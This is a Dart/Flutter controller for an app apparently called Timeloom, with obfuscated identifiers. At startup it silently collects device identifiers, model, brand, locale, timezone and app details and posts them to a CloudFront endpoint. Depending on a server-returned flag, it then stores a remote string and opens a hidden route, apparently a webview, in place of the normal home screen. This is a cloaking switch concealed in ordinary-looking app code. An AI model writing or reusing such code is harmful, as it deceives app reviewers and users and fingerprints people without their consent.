import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'dart:io';
import 'package:get/get.dart';
import 'package:dio/dio.dart';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:package_info_plus/package_info_plus.dart';


class TimeloomBackLogic extends GetxController {

  var pzlkxtdc = RxBool(false);
  var sjognfuled = RxBool(true);
  var sfwzxq = RxString("");
  var vftx = RxBool(false);
  var tyjwaqsg = RxBool(true);
  final lokjuaf = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ebmctgu();
  }


  Future<void> ebmctgu() async {
    vftx.value = true;
    tyjwaqsg.value = true;
    sjognfuled.value = false;

    lokjuaf.post("https://d3qk61pe4oe18r.cloudfront.net/nebivjgz",data: await ydcbgxni()).then((value) {
      var kmrazfln = value.data["kmrazfln"] as String;
      var juqd = value.data["juqd"] as bool;
      if (juqd) {
        sfwzxq.value = kmrazfln;
        zcxjhap();
      } else {
        iwxscda();
      }
    }).catchError((e) {
      sjognfuled.value = true;
      tyjwaqsg.value = true;
      vftx.value = false;
    });
  }

  Future<Map<String, dynamic>> ydcbgxni() async {
    final DeviceInfoPlugin jaunhswg = DeviceInfoPlugin();
    PackageInfo ouwbrkf_xiaywvf = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var uixqpeko = Platform.localeName;
    var yboun_AYOJqULp = currentTimeZone;

    var yboun_JWxnf = ouwbrkf_xiaywvf.packageName;
    var yboun_HKgki = ouwbrkf_xiaywvf.version;
    var yboun_CTY = ouwbrkf_xiaywvf.buildNumber;

    var yboun_cLih = ouwbrkf_xiaywvf.appName;
    var yboun_rJW = "";
    var yboun_VADLWq  = "";
    var yboun_fH = "";
    var ohrmcsnv = "";
    var pqfrxvi = "";
    var sfibdjm = "";
    var boiye = "";


    var yboun_RioKdX = "";
    var yboun_faZYR = false;

    if (GetPlatform.isAndroid) {
      yboun_RioKdX = "android";
      var ubyetq = await jaunhswg.androidInfo;

      yboun_fH = ubyetq.brand;

      yboun_rJW  = ubyetq.model;
      yboun_VADLWq = ubyetq.id;

      yboun_faZYR = ubyetq.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      yboun_RioKdX = "ios";
      var zougmsfqct = await jaunhswg.iosInfo;
      yboun_fH = zougmsfqct.name;
      yboun_rJW = zougmsfqct.model;

      yboun_VADLWq = zougmsfqct.identifierForVendor ?? "";
      yboun_faZYR  = zougmsfqct.isPhysicalDevice;
    }
    var res = {
      "yboun_CTY": yboun_CTY,
      "yboun_HKgki": yboun_HKgki,
      "pqfrxvi" : pqfrxvi,
      "yboun_rJW": yboun_rJW,
      "yboun_AYOJqULp": yboun_AYOJqULp,
      "boiye" : boiye,
      "yboun_fH": yboun_fH,
      "yboun_VADLWq": yboun_VADLWq,
      "uixqpeko": uixqpeko,
      "yboun_RioKdX": yboun_RioKdX,
      "yboun_faZYR": yboun_faZYR,
      "ohrmcsnv" : ohrmcsnv,
      "yboun_cLih": yboun_cLih,
      "sfibdjm" : sfibdjm,
      "yboun_JWxnf": yboun_JWxnf,

    };
    return res;
  }

  Future<void> iwxscda() async {
    Get.offNamed("/home");
  }

  Future<void> zcxjhap() async {
    Get.offNamed("/note/read");
  }

}
